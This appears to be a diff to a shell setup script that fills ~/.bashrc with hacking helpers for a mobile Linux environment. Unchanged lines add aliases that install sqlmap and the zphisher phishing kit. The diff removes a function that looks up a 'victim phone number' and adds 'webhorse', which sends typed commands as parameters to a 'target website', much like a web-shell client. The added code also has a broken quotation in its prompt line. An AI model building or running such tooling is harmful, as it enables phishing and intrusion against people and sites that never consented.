@@ -134,23 +134,6 @@ ls /etc >/dev/null 2>&1 && echo "Cavalinux MoreAccess Is Activated For Your Devi
 }
 ' >> ~/.bashrc
 echo 'alias setslmp="pkg install python2 && git clone https://github.com/sqlmapproject/sqlmap && mv sqlmap/* . && alias sqlmap=\"python2 sqlmap.py\"" >> ~/.bashrc' >> ~/.bashrc
-echo '
-numbelp(){
-read -p "Insert your victim phone number: " phone_number
-first_three_characters=${phone_number:0:3}
-url="https://www.itmnetworks.com.br/ddi-dos-paises-codigos-internacionais-de-telefone"
-curl -s "$url" > temp.html
-ddi_header=$(grep -A1 "<td>$first_three_characters</td>" temp.html | tail -n 1 | sed -e 's/<[^>]*>//g')
-translated_ddi_header=$(trans -b :en "$ddi_header")
-if [ -n "$translated_ddi_header" ]; then
-    echo "$translated_ddi_header"
-else
-    echo "Country: N/A"
-fi
-
-rm temp.html
-}
-' >> ~/.bashrc
 echo "alias setzp='pkg install tur-repo -y && pkg install zphisher -y && echo Installed, Now run zphisher.'" >> ~/.bashrc
 echo '
 locip(){
@@ -180,3 +163,31 @@ echo "ISP: $isp"
 echo "Organization: $organization"
 } ' >> ~/.bashrc
 echo "alias fehk='pkg install cmatrix -y >/dev/null 2>&1 && cmatrix'" >> ~/.bashrc
+echo '
+webhorse(){
+read -p "Insert your target website": " site
+curl -L "$site" > webhorse.txt
+
+while true; do
+    read -p "webserver> " parametro
+
+    case "$parametro" in
+        "quit")
+            echo "Quitting."
+            break
+            ;;
+        *)
+            parametro_escapado=$(printf "%q" "$parametro")
+            resultado=$(curl -L "${site}/?$parametro_escapado")
+            conteudo_webhorse=$(cat webhorse.txt)
+
+            if [ "$resultado" == "$conteudo_webhorse" ]; then
+                echo "Command not found."
+            else
+                echo "Result:"
+                echo "$resultado"
+            fi
+            ;;
+    esac
+done
+} ' >> ~/.bashrc
